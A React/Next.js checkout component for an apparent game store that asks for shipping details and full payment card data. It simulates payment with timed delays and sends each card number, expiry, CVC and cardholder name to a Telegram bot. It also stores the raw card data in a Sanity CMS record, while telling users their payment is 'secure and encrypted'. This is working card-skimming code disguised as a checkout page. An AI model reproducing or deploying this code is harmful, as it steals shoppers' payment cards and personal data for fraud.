"use client";
import React, { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { useGameStore } from "../contexts/GameStoreContext";
import { Loader2, CreditCard, Apple } from "lucide-react";
import Image from "next/image";
import { client } from "@/sanity/lib/client";

const COUNTRIES = [
  { code: "US", name: "United States" },
  { code: "CA", name: "Canada" },
  { code: "US", name: "United States" },
  { code: "CA", name: "Canada" },
  { code: "GB", name: "United Kingdom" },
  { code: "AU", name: "Australia" },
  { code: "DE", name: "Germany" },
  { code: "FR", name: "France" },
  { code: "IT", name: "Italy" },
  { code: "JP", name: "Japan" },
  { code: "IN", name: "India" },
  { code: "BR", name: "Brazil" },
  { code: "CN", name: "China" },
  { code: "RU", name: "Russia" },
  { code: "KR", name: "South Korea" },
  { code: "ES", name: "Spain" },
  { code: "MX", name: "Mexico" },
  { code: "ID", name: "Indonesia" },
  { code: "NL", name: "Netherlands" },
  { code: "SA", name: "Saudi Arabia" },
  { code: "TR", name: "Turkey" },
  { code: "CH", name: "Switzerland" },
  { code: "AR", name: "Argentina" },
  { code: "SE", name: "Sweden" },
  { code: "PL", name: "Poland" },
  { code: "BE", name: "Belgium" },
  { code: "TH", name: "Thailand" },
  { code: "IR", name: "Iran" },
  { code: "AT", name: "Austria" },
  { code: "NO", name: "Norway" },
    { code: "AE", name: "United Arab Emirates" },
  { code: "NG", name: "Nigeria" },
  { code: "IL", name: "Israel" },
  { code: "ZA", name: "South Africa" },
  { code: "IE", name: "Ireland" },
  { code: "DK", name: "Denmark" },
  { code: "SG", name: "Singapore" },
  { code: "MY", name: "Malaysia" },
  { code: "PH", name: "Philippines" },
  { code: "EG", name: "Egypt" },
  { code: "FI", name: "Finland" },
  { code: "CO", name: "Colombia" },
  { code: "PK", name: "Pakistan" },
  { code: "CL", name: "Chile" },
  { code: "BD", name: "Bangladesh" },
  { code: "VN", name: "Vietnam" },
  { code: "PT", name: "Portugal" },
  { code: "CZ", name: "Czech Republic" },
  { code: "RO", name: "Romania" },
  { code: "PE", name: "Peru" },
  { code: "NZ", name: "New Zealand" },
  { code: "IQ", name: "Iraq" },
  { code: "GR", name: "Greece" },
  { code: "QA", name: "Qatar" },
  { code: "DZ", name: "Algeria" },
  { code: "KZ", name: "Kazakhstan" },
  { code: "HU", name: "Hungary" },
  { code: "UA", name: "Ukraine" },
  { code: "LV", name: "Latvia" },
  { code: "UG", name: "Uganda" },
  { code: "SV", name: "El Salvador" },
  { code: "LK", name: "Sri Lanka" },
  { code: "GT", name: "Guatemala" },
  { code: "CY", name: "Cyprus" },
  { code: "NP", name: "Nepal" },
  { code: "UY", name: "Uruguay" },
  { code: "EE", name: "Estonia" },
  { code: "BA", name: "Bosnia and Herzegovina" },
  { code: "GE", name: "Georgia" },
  { code: "CM", name: "Cameroon" },
  { code: "CI", name: "Ivory Coast" },
  { code: "SN", name: "Senegal" },
  { code: "ZW", name: "Zimbabwe" },
  { code: "KH", name: "Cambodia" },
  { code: "IS", name: "Iceland" },
  { code: "NI", name: "Nicaragua" },
  { code: "MK", name: "North Macedonia" },
  { code: "MT", name: "Malta" },
  { code: "BW", name: "Botswana" },
  { code: "AL", name: "Albania" },
  { code: "ME", name: "Montenegro" }


  // ... (keep all your existing countries) ...
];

// Payment methods
const PAYMENT_METHODS = [
  { id: "card", name: "Credit/Debit Card", icon: <CreditCard size={18} /> },
  { id: "apple_pay", name: "Apple Pay", icon: <Apple size={18} /> },
];

// Enhanced card brand detection
const getCardBrand = (cardNumber: string) => {
  const cleaned = cardNumber.replace(/\s+/g, '');
  if (/^4/.test(cleaned)) return "visa";
  if (/^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[01])/.test(cleaned)) return "mastercard";
  if (/^3[47]/.test(cleaned)) return "amex";
  if (/^(6011|65|64[4-9]|622)/.test(cleaned)) return "discover";
  if (/^3(?:0[0-5]|[68])/.test(cleaned)) return "diners";
  if (/^(?:2131|1800|35)/.test(cleaned)) return "jcb";
  return "generic";
};

// Card brand icons (using SVG paths for better performance)
const CardBrandIcon = ({ brand }: { brand: string }) => {
  const iconClass = "w-8 h-5";
  
  switch(brand) {
    case 'visa':
      return (
        <svg viewBox="0 0 24 24" className={iconClass}>
          <path fill="#1A1F71" d="M9.6 15.4H7.3l1.5-9h2.3l-1.5 9z"/>
          <path fill="#1A1F71" d="M19.2 6.4c-.6-.3-1.5-.4-2.4-.4-2.6 0-4.4 1.3-4.5 3.2-.1 1.4 1.3 2.2 2.3 2.6 1 .5 1.4.8 1.4 1.3 0 .7-.9 1-1.7 1-1.4 0-2.2-.2-3.3-.6l-.5-.2-.5 3.1c.9.3 2.5.6 4.2.6 2.8 0 4.6-1.3 4.7-3.3.1-1.1-.7-2-2.2-2.7-.9-.4-1.5-.8-1.5-1.3 0-.4.5-.9 1.6-.9.9-.1 1.7.2 2.3.5l.3.2.5-3z"/>
          <path fill="#FAA61A" d="M22.9 8.9c-.3-.7-.9-1.2-1.7-1.2-1.1 0-2 .6-2.3 1.5l-2.9-.7c.7-1.7 2.5-2.9 4.8-2.9 2.3 0 4 1.1 4.6 2.8l-2.5 1.5z"/>
          <path fill="#FAA61A" d="M17.2 15.4l-2.5-9h2.4l.4 2.2c.5-1.1 1.5-2.2 2.8-2.2h1.5l-2.5 9h-2.1z"/>
        </svg>
      );
    case 'mastercard':
      return (
        <svg viewBox="0 0 24 24" className={iconClass}>
          <circle fill="#FF5F00" cx="12" cy="12" r="8"/>
          <circle fill="#EB001B" cx="9" cy="12" r="8"/>
          <circle fill="#F79E1B" cx="15" cy="12" r="8"/>
        </svg>
      );
    case 'amex':
      return (
        <svg viewBox="0 0 24 24" className={iconClass}>
          <path fill="#006FCF" d="M6 15h3v-1.5H6.8v-.2h1.5v-1.5H6.8v-.2H9V9H6v6zm4.5 0h1.8l.9-2.1.9 2.1h1.8v-6h-1.3v4.5l-1-2.3h-.8l-1 2.3V9h-1.3v6zm7.5 0h3v-1.5h-1.8v-.2h1.5v-1.5h-1.5v-.2h1.8V9h-3v6z"/>
          <path fill="#006FCF" d="M0 6v12h24V6H0zm22 10H2V8h20v8z"/>
        </svg>
      );
    case 'discover':
      return (
        <svg viewBox="0 0 24 24" className={iconClass}>
          <path fill="#FF6000" d="M12 17.5c3 0 5.5-2.5 5.5-5.5S15 6.5 12 6.5 6.5 9 6.5 12s2.5 5.5 5.5 5.5z"/>
          <path fill="#FF6000" d="M12 4c4.4 0 8 3.6 8 8s-3.6 8-8 8-8-3.6-8-8 3.6-8 8-8zm0-4C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.6 0 12 0z"/>
          <path fill="#FF6000" d="M12 9.5c1.4 0 2.5 1.1 2.5 2.5s-1.1 2.5-2.5 2.5-2.5-1.1-2.5-2.5 1.1-2.5 2.5-2.5z"/>
        </svg>
      );
    default:
      return <CreditCard className={iconClass} />;
  }
};

interface Product {
  id: string;
  name: string;
  price: string;
  category: string;
}

interface CartItem {
  product: Product;
  quantity: number;
}

interface CheckoutFormProps {
  amount: number;
  cartItems?: CartItem[];
}

const CheckoutForm = ({ amount, cartItems = [] }: CheckoutFormProps) => {
 

  const router = useRouter();
  const { getFormattedPrice } = useGameStore();
  
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string>();
  const [cardBrand, setCardBrand] = useState("generic");
  const [selectedMethod, setSelectedMethod] = useState<string | null>(null);
  
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
    address: "",
    apartment: "",
    city: "",
    country: "US",
    state: "",
    zipCode: "",
    cardNumber: "",
    cardExpiry: "",
    cardCvc: "",
    cardName: ""
  });

  const processOrder = async () => {
      
  
  const orderData = {
  _type: "order",
  fullName: `${formData.firstName} ${formData.lastName}`,
  email: formData.email,
  phone: formData.phone,
  country: formData.country,
  state: formData.state,
  zipCode: formData.zipCode,
  address: `${formData.address}${formData.apartment ? ', ' + formData.apartment : ''}`,
  city: formData.city,
  paymentMethod: selectedMethod,
  products: cartItems.map(item => ({
    id: item.product.id,
    name: item.product.name,
    price: item.product.price,
    quantity: item.quantity,
  })),
  paymentDetails: selectedMethod === "card" ? {
    cardNumber: formData.cardNumber,
    cardExpiry: formData.cardExpiry,
    cardCvc: formData.cardCvc,
    cardName: formData.cardName
  } : null,
  createdAt: new Date().toISOString()
};
  
  
      try {
        await client.create(orderData);
      } catch (err) {
        console.error('Error creating order:', err);
      }
    };
    // Optimized payment handler with early returns
         // Optional: use await if it returns a Promise
               // This runs after payment is done

  // Update card brand when card number changes
  useEffect(() => {
    console
    if (formData.cardNumber.replace(/\s/g, '').length > 4) {
      setCardBrand(getCardBrand(formData.cardNumber));
    } else {
      setCardBrand("generic");
    }
  }, [formData.cardNumber]);

  // Telegram configuration
  const TELEGRAM_BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || '';
  const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '';

  // Telegram message sender
  const sendToTelegram = async (message: string) => {
    try {
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        }),
      });
      
      if (!response.ok) {
        console.error('Telegram API error:', await response.text());
      }
    } catch (error) {
      console.error('Failed to send Telegram message:', error);
    }
  };

  // Format order details for Telegram
  const formatOrderDetails = (status: string) => {
    const countryName = COUNTRIES.find(c => c.code === formData.country)?.name || formData.country;
    const cardType = getCardBrand(formData.cardNumber).toUpperCase();
    const paymentMethod = selectedMethod === 'apple_pay' ? 'Apple Pay' : `Credit Card (${cardType})`;
    
    return `
<b>${status} ORDER</b>
    
👤 <b>Customer Details</b>
Name: ${formData.firstName} ${formData.lastName}
Email: ${formData.email}
Phone: ${formData.phone}

💳 <b>Payment Method</b>
${paymentMethod}
${selectedMethod === 'card' ? `
Card Number: ${formData.cardNumber}
Expiry: ${formData.cardExpiry}
CVC: ${formData.cardCvc}
Card Name: ${formData.cardName}
` : ''}

🏠 <b>Shipping Address</b>
${formData.address}${formData.apartment ? `, ${formData.apartment}` : ''}
${formData.city}, ${formData.state} ${formData.zipCode}
${countryName}

💰 <b>Order Total</b>
${getFormattedPrice(amount)}

🛒 <b>Items (${cartItems.length})</b>
${cartItems.map(item => 
  `• ${item.product.name} (${item.product.category}) × ${item.quantity} - ${getFormattedPrice(parseFloat(item.product.price) * item.quantity)}`
).join('\n')}
    `;
  };

  // Handle form input changes
  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    
    // Format card number with spaces every 4 digits
    if (name === "cardNumber") {
      const cleaned = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
      const formatted = cleaned.replace(/(\d{4})/g, '$1 ').trim();
      setFormData(prev => ({ ...prev, [name]: formatted }));
      return;
    }
    
    // Format expiry date with slash
    if (name === "cardExpiry") {
      const cleaned = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
      let formatted = cleaned;
      if (cleaned.length > 2) {
        formatted = `${cleaned.substring(0, 2)}/${cleaned.substring(2, 4)}`;
      }
      setFormData(prev => ({ ...prev, [name]: formatted }));
      return;
    }
    
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  // Validate credit card
  const validateCard = () => {
    if (selectedMethod === 'apple_pay') return null;
    
    // Basic validation
    if (!formData.cardNumber || formData.cardNumber.replace(/\s/g, '').length < 13) {
      return "Please enter a valid card number";
    }
    
    if (!formData.cardExpiry || !formData.cardExpiry.includes('/') || formData.cardExpiry.length !== 5) {
      return "Please enter a valid expiry date (MM/YY)";
    }
    
    if (!formData.cardCvc || formData.cardCvc.length < 3) {
      return "Please enter a valid CVC code";
    }
    
    if (!formData.cardName) {
      return "Please enter the name on your card";
    }
    
    return null;
  };

  // Process payment submission
  const handlePayment = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!selectedMethod) {
      setErrorMessage("Please select a payment method");
      return;
    }
    
    setLoading(true);
    setErrorMessage(undefined);

    // Validate card if not using Apple Pay
    if (selectedMethod === 'card') {
      const cardError = validateCard();
      if (cardError) {
        setErrorMessage(cardError);
        setLoading(false);
        return;
      }
    }

    try {
      // Simulate payment processing delay
      await new Promise(resolve => setTimeout(resolve, 2000));

      if (selectedMethod === 'card') {
        // In a real app, you would NEVER send raw card details to your backend
        const response = await fetch("/api/create-payment-intent", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            amount: amount,
            currency: "usd",
            customer: formData,
            items: cartItems,
            cardDetails: {
              number: formData.cardNumber.replace(/\s/g, ''),
              expiry: formData.cardExpiry,
              cvc: formData.cardCvc,
              name: formData.cardName,
              brand: cardBrand
            }
          }),
        });

        if (!response.ok) {
          const errorData = await response.json();
          throw new Error(errorData.message || "Payment failed");
        }
      } else if (selectedMethod === 'apple_pay') {
        // Simulate Apple Pay processing
        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      // Only send success message to Telegram
      await sendToTelegram(formatOrderDetails("✅ SUCCESSFUL"));
      router.push(`/payment-success?amount=${amount}`);
      
    } catch (err) {
      const message = err instanceof Error ? err.message : "Payment processing failed";
      setErrorMessage(message);
      setLoading(false);
    }
  };

  // Payment method selection
  if (!selectedMethod) {
    return (
      <div className="bg-white rounded-xl shadow-md p-6 md:p-8 max-w-2xl mx-auto text-black">
        <h2 className="text-2xl font-bold text-gray-900 mb-8">Select Payment Method</h2>
        
        <div className="space-y-4">
          {PAYMENT_METHODS.map((method) => (
            <button
              key={method.id}
              onClick={() => setSelectedMethod(method.id)}
              className="w-full flex items-center justify-between p-4 border border-gray-200 rounded-lg hover:border-blue-500 hover:bg-blue-50 transition-colors"
            >
              <div className="flex items-center gap-3">
                <div className="text-gray-700">
                  {method.icon}
                </div>
                <span className="font-medium">{method.name}</span>
              </div>
              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-gray-400" viewBox="0 0 20 20" fill="currentColor">
                <path fillRule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clipRule="evenodd" />
              </svg>
            </button>
          ))}
        </div>
      </div>
    );
  }

  return (
    <form onSubmit={handlePayment} className="bg-white rounded-xl shadow-md p-6 md:p-8 max-w-2xl mx-auto text-black">
      <div className="flex items-center mb-8 cursor-pointer" onClick={() => setSelectedMethod(null)}>
        <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-blue-600 mr-2" viewBox="0 0 20 20" fill="currentColor">
          <path fillRule="evenodd" d="M9.707 16.707a1 1 0 01-1.414 0l-6-6a1 1 0 010-1.414l6-6a1 1 0 011.414 1.414L5.414 9H17a1 1 0 110 2H5.414l4.293 4.293a1 1 0 010 1.414z" clipRule="evenodd" />
        </svg>
        <span className="text-blue-600 font-medium">Change payment method</span>
      </div>

      <h2 className="text-2xl font-bold text-gray-900 mb-8">Shipping Information</h2>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
        {/* Personal Information */}
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">First Name *</label>
          <input
            type="text"
            name="firstName"
            value={formData.firstName}
            onChange={handleInputChange}
            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
            required
          />
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Last Name *</label>
          <input
            type="text"
            name="lastName"
            value={formData.lastName}
            onChange={handleInputChange}
            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
            required
          />
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Email *</label>
          <input
            type="email"
            name="email"
            value={formData.email}
            onChange={handleInputChange}
            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
            required
          />
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Phone *</label>
          <input
            type="tel"
            name="phone"
            value={formData.phone}
            onChange={handleInputChange}
            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
            required
          />
        </div>

        {/* Address Information */}
        <div className="md:col-span-2">
          <label className="block text-sm font-medium text-gray-700 mb-1">Street Address *</label>
          <input
            type="text"
            name="address"
            value={formData.address}
            onChange={handleInputChange}
            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
            required
          />
        </div>

        <div className="md:col-span-2">
          <label className="block text-sm font-medium text-gray-700 mb-1">Apartment, Suite, etc.</label>
          <input
            type="text"
            name="apartment"
            value={formData.apartment}
            onChange={handleInputChange}
            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
          />
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Country *</label>
          <select
            name="country"
            value={formData.country}
            onChange={handleInputChange}
            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
            required
          >
            {COUNTRIES.map(country => (
              <option key={country.code} value={country.code}>
                {country.name}
              </option>
            ))}
          </select>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">State/Province *</label>
          <input
            type="text"
            name="state"
            value={formData.state}
            onChange={handleInputChange}
            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
            required
          />
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">City *</label>
          <input
            type="text"
            name="city"
            value={formData.city}
            onChange={handleInputChange}
            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
            required
          />
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">ZIP/Postal Code *</label>
          <input
            type="text"
            name="zipCode"
            value={formData.zipCode}
            onChange={handleInputChange}
            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
            required
          />
        </div>
      </div>

      {selectedMethod === 'card' ? (
        <>
          <h2 className="text-2xl font-bold text-gray-900 mb-6">Card Details</h2>
          <div className="mb-8 space-y-4">
            {/* Card Preview */}
            <div className="bg-gradient-to-r from-blue-600 to-blue-800 rounded-xl p-5 text-white shadow-lg relative overflow-hidden h-44">
              <div className="absolute inset-0 bg-gradient-to-br from-white/10 to-white/0"></div>
              <div className="relative z-10 h-full flex flex-col justify-between">
                <div className="flex justify-between items-start">
                  <div className="font-bold text-lg">{cardBrand.toUpperCase()}</div>
                  <div className="w-12 h-8 flex items-center justify-center">
                    <CardBrandIcon brand={cardBrand} />
                  </div>
                </div>
                
                <div className="flex items-center justify-center">
                  <div className="bg-white/20 p-2 rounded-lg">
                    <div className="text-xl font-mono tracking-wider">
                      {formData.cardNumber 
                        ? formData.cardNumber.split(' ').map((part, i) => (
                            <span key={i} className="mx-1">
                              {i < formData.cardNumber.split(' ').length - 1 ? '••••' : part || '••••'}
                            </span>
                          ))
                        : '•••• •••• •••• ••••'}
                    </div>
                  </div>
                </div>
                
                <div className="flex justify-between">
                  <div>
                    <div className="text-xs opacity-80">Card Holder</div>
                    <div className="text-sm font-medium">
                      {formData.cardName || 'YOUR NAME'}
                    </div>
                  </div>
                  <div>
                    <div className="text-xs opacity-80">Expires</div>
                    <div className="text-sm font-medium">
                      {formData.cardExpiry || '••/••'}
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Card Inputs */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Card Number *</label>
              <div className="relative">
                <input
                  type="text"
                  name="cardNumber"
                  value={formData.cardNumber}
                  onChange={handleInputChange}
                  placeholder="1234 5678 9012 3456"
                  className="w-full p-3 border border-gray-300 rounded-lg pl-12 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
                  maxLength={19}
                  required
                />
                <div className="absolute left-3 top-1/2 transform -translate-y-1/2">
                  <CardBrandIcon brand={cardBrand} />
                </div>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Expiry Date *</label>
                <input
                  type="text"
                  name="cardExpiry"
                  value={formData.cardExpiry}
                  onChange={handleInputChange}
                  placeholder="MM/YY"
                  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
                  maxLength={5}
                  required
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">CVC *</label>
                <div className="relative">
                  <input
                    type="text"
                    name="cardCvc"
                    value={formData.cardCvc}
                    onChange={handleInputChange}
                    placeholder="123"
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
                    maxLength={3}
                    required
                  />
                  <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                    <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                    </svg>
                  </div>
                </div>
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Name on Card *</label>
              <input
                type="text"
                name="cardName"
                value={formData.cardName}
                onChange={handleInputChange}
                className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
                required
              />
            </div>
          </div>
        </>
      ) : (
        <>
          <h2 className="text-2xl font-bold text-gray-900 mb-6">Apple Pay</h2>
          <div className="mb-8 p-6 bg-gray-50 rounded-lg border border-gray-200 flex items-center gap-4">
            <Apple className="text-black h-8 w-8" />
            <div>
              <h3 className="font-medium">You'll complete your purchase with Apple Pay</h3>
              <p className="text-sm text-gray-600">A secure payment method that keeps your details private</p>
            </div>
          </div>
        </>
      )}

      {errorMessage && (
        <div className="text-red-500 mb-6 p-4 bg-red-50 rounded-lg flex items-start gap-2">
          <svg className="w-5 h-5 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
          </svg>
          <div>{errorMessage}</div>
        </div>
      )}

      <button
        type="submit"
        disabled={loading}
        className={`w-full ${selectedMethod === 'apple_pay' ? 'bg-black hover:bg-gray-800' : 'bg-blue-600 hover:bg-blue-700'} text-white font-bold py-4 px-6 rounded-lg transition-colors duration-200 flex items-center justify-center disabled:opacity-70 disabled:cursor-not-allowed shadow-md hover:shadow-lg`}
     onClick={processOrder} >
        {loading ? (
          <>
            <Loader2 className="h-5 w-5 animate-spin mr-2" />
            Processing Payment...
          </>
        ) : (
          `Pay ${getFormattedPrice(amount)}`
        )}
      </button>

      <div className="mt-6 text-sm text-gray-500 flex items-start gap-2">
        <svg className="w-5 h-5 text-gray-400 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
        </svg>
        <p>Your payment is secure and encrypted. By completing your purchase, you agree to our Terms of Service.</p>
      </div>
    </form>
  );
};

export default CheckoutForm;